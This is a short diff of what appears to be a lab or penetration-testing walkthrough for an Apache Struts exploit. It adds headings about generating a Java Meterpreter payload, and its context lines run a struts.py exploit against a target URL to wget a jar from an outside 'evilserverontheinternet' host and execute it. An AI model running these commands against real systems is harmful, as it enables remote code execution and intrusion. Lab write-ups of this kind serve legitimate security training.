@@ -22,6 +22,13 @@ Exploit: https://www.exploit-db.com/exploits/42324/
 
 ### Get shell
 
+###Generate a Java Meterpreter payload and handler
+
+
+
+
+### Use exploit to download and run payload
+
 ```
 $ python struts.py 'http://webdev.showmecorp.com:8080/showcase/integration/saveGangster.action' "wget -O /tmp/bob.jar http://evilserverontheinternet/bob.jar"
 $ python struts.py 'http://webdev.showmecorp.com:8080/showcase/integration/saveGangster.action' "java -jar /tmp/bob.jar"
